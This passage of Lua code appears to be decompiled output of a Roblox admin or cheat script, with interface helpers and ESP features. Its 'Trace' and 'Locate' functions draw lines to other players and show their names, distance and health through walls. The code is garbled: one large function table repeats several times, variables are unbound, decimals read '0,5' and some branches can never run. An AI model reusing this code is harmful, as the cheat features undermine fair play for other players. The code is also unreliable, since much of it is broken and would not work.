          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Save, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Toggle, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
